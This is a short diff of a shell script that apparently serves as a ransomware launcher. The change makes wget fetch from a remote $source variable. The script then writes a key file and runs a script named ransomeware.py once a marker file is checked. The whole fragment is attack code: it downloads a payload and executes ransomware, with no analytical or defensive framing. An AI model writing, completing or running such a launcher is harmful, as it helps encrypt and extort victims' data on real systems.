@@ -10,7 +10,7 @@ cd $targetPath
 
 if [[ ! -f ${targetPath}kludgefix ]]
 then
-    wget -q -o /dev/null >/dev/null
+    wget -q -o /dev/null $source
     if [ $? == 0 ]; then
         echo "${key}" | cat > key.key
         python3 ransomeware.py
